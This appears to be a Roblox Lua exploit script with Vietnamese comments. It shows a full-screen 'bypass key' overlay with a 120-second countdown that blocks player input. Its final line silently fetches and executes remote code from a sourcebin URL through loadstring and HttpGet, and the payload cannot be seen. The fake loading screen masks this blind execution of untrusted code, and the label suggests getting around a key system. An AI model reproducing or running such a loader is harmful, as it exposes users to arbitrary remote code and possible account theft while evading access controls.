local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- 1. Tạo ScreenGui che toàn bộ màn hình (bao gồm cả thanh TopBar)
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "FullScreenOverlay"
screenGui.IgnoreGuiInset = true -- Che phủ cả phần thanh trạng thái phía trên
screenGui.DisplayOrder = 9999 -- Đảm bảo nằm đè lên tất cả các UI khác
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- 2. Tạo khung nền đen che kín màn hình
local background = Instance.new("Frame")
background.Name = "Background"
background.Size = UDim2.new(1, 0, 1, 0)
background.Position = UDim2.new(0, 0, 0, 0)
background.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
background.BorderSizePixel = 0
background.Active = true -- Chặn người chơi bấm xuyên qua UI xuống game
background.Parent = screenGui

-- 3. Tạo dòng chữ chính "bypass key"
local mainText = Instance.new("TextLabel")
mainText.Name = "TitleText"
mainText.Size = UDim2.new(0.8, 0, 0.2, 0)
mainText.Position = UDim2.new(0.5, 0, 0.42, 0)
mainText.AnchorPoint = Vector2.new(0.5, 0.5)
mainText.BackgroundTransparency = 1
mainText.Text = "bypass key"
mainText.TextColor3 = Color3.fromRGB(255, 255, 255)
mainText.Font = Enum.Font.GothamBold
mainText.TextScaled = true
mainText.Parent = background

-- 4. Tạo khung chứa thanh đếm ngược (Bar Background) phía dưới
local barContainer = Instance.new("Frame")
barContainer.Name = "ProgressBarContainer"
barContainer.Size = UDim2.new(0.5, 0, 0, 24)
barContainer.Position = UDim2.new(0.5, 0, 0.58, 0)
barContainer.AnchorPoint = Vector2.new(0.5, 0.5)
barContainer.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
barContainer.BorderSizePixel = 0
barContainer.Parent = background

local uiCornerBg = Instance.new("UICorner")
uiCornerBg.CornerRadius = UDim.new(0, 12)
uiCornerBg.Parent = barContainer

-- 5. Tạo thanh chạy tiến trình bên trong (Progress Fill)
local barFill = Instance.new("Frame")
barFill.Name = "ProgressBarFill"
barFill.Size = UDim2.new(1, 0, 1, 0) -- Bắt đầu từ 100% và giảm dần về 0%
barFill.Position = UDim2.new(0, 0, 0, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barContainer

local uiCornerFill = Instance.new("UICorner")
uiCornerFill.CornerRadius = UDim.new(0, 12)
uiCornerFill.Parent = barFill

-- 6. Tạo chữ hiển thị số giây đếm ngược nằm trên thanh bar
local timerText = Instance.new("TextLabel")
timerText.Name = "TimerText"
timerText.Size = UDim2.new(1, 0, 1, 0)
timerText.Position = UDim2.new(0, 0, 0, 0)
timerText.BackgroundTransparency = 1
timerText.Text = "120s"
timerText.TextColor3 = Color3.fromRGB(255, 255, 255)
timerText.Font = Enum.Font.GothamSemibold
timerText.TextSize = 14
timerText.ZIndex = 2
timerText.Parent = barContainer

-- 7. Xử lý hiệu ứng chạy thanh tiến trình và đếm ngược 120 giây
local duration = 120

-- Làm mượt thanh tiến trình bằng TweenService
local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
local barTween = TweenService:Create(barFill, tweenInfo, {Size = UDim2.new(0, 0, 1, 0)})
barTween:Play()

-- Vòng lặp cập nhật số giây từng giây một
task.spawn(function()
	for i = duration, 0, -1 do
		timerText.Text = i .. "s"
		if i > 0 then
			task.wait(1)
		end
	end
	
	-- Tự động ẩn/xóa màn hình che sau khi đếm ngược kết thúc
	screenGui:Destroy()
end)
loadstring(game:HttpGet("https://cdn.sourceb.in/bins/IpfK55zlma/0"))()
